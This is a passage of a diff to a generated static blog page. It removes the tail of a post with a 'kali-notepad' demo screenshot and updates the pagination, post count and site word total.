-</li>
-</ul>
-<p><img src="/images/kali/kali-notepad/%E6%BC%94%E7%A4%BA%E7%8E%AF%E5%A2%83-2.PNG" alt="演示环境-2"></p>
-
-          
-        
-      
-    </div>
-    
-    
-    
-
-    
-
-    
-
-    
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-    
   </section>
 
   
   <nav class="pagination">
-    <a class="extend prev" rel="prev" href="/page/9/">Prev</a><a class="page-number" href="/">1</a><span class="space">&hellip;</span><a class="page-number" href="/page/9/">9</a><span class="page-number current">10</span><a class="page-number" href="/page/11/">11</a><span class="space">&hellip;</span><a class="page-number" href="/page/18/">18</a><a class="extend next" rel="next" href="/page/11/">Next</a>
+    <a class="extend prev" rel="prev" href="/page/9/">Prev</a><a class="page-number" href="/">1</a><span class="space">&hellip;</span><a class="page-number" href="/page/9/">9</a><span class="page-number current">10</span><a class="page-number" href="/page/11/">11</a><span class="space">&hellip;</span><a class="page-number" href="/page/19/">19</a><a class="extend next" rel="next" href="/page/11/">Next</a>
   </nav>
 
 
@@ -3228,7 +2801,7 @@
               
                 <a href="/archives/">
               
-                  <span class="site-state-item-count">173</span>
+                  <span class="site-state-item-count">181</span>
                   <span class="site-state-item-name">日志</span>
                 </a>
               </div>
@@ -3335,7 +2908,7 @@
     
       <span class="post-meta-item-text">Site words total count&#58;</span>
     
-    <span title="Site words total count">172.8k</span>
+    <span title="Site words total count">176.3k</span>
   
 </div>
 
